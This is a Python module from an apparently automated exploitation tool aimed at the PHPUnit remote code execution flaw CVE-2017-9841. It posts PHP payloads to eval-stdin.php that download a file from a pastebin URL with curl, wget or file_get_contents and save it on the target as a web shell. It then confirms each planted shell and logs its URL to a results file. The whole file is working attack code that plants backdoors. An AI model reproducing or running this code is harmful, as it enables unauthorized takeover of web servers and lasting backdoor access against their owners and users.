# coding=utf-8
import requests
import printModule

r = '\033[31m'
g = '\033[32m'
y = '\033[33m'
b = '\033[34m'
m = '\033[35m'
c = '\033[36m'
w = '\033[37m'

def Exploit(url, Vulnurl, Vname, CMS):
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) "
                      "AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = Vulnurl
    PostData1 = '<?php system("curl -O https://pastebin.com/raw/R8JQ6P0Q"); system("mv kojoralohu up.php"); ?>'
    PostData2 = '<?php system("wget https://pastebin.com/raw/R8JQ6P0Q -O up2.php"); ?>'
    PostData3 = '<?php fwrite(fopen("up3.php","w+"),file_get_contents("https://pastebin.com/raw/R8JQ6P0Q")); ?>'
    vulnurl = url + payload
    shell1 = str(vulnurl).replace('eval-stdin.php', 'up.php')
    shell2 = str(vulnurl).replace('eval-stdin.php', 'up2.php')
    shell3 = str(vulnurl).replace('eval-stdin.php', 'up3.php')
    try:
        session = requests.session()
        session.get('http://' + vulnurl, data=PostData1, headers=headers, timeout=10, verify=False, allow_redirects=False)
        session.get('http://' + vulnurl, data=PostData2, headers=headers, timeout=10, verify=False, allow_redirects=False)
        session.get('http://' + vulnurl, data=PostData3, headers=headers, timeout=10, verify=False, allow_redirects=False)
        CheckShell1 = requests.get('http://' + shell1, headers=headers, timeout=10)
        CheckShell2 = requests.get('http://' + shell2, headers=headers, timeout=10)
        CheckShell3 = requests.get('http://' + shell3, headers=headers, timeout=10)
        if 'Vuln!!' in str(CheckShell1.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write('{}\n'.format(shell1))
            return printModule.returnYes(url, 'CVE-2017-9841', 'PHPUnit {}'.format(Vname), CMS)
        elif 'Vuln!!' in str(CheckShell2.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write('{}\n'.format(shell2))
            return printModule.returnYes(url, 'CVE-2017-9841', 'PHPUnit {}'.format(Vname), CMS)
        elif 'Vuln!!' in str(CheckShell3.content):
            with open('result/Shell_results.txt', 'a') as writer:
                writer.write('{}\n'.format(shell3))
            return printModule.returnYes(url, 'CVE-2017-9841', 'PHPUnit {}'.format(Vname), CMS)
        else:
            return printModule.returnNo(url, 'CVE-2017-9841', 'PHPUnit {}'.format(Vname), CMS)
    except:
        return printModule.returnNo(url, 'CVE-2017-9841', 'PHPUnit {}'.format(Vname), CMS)
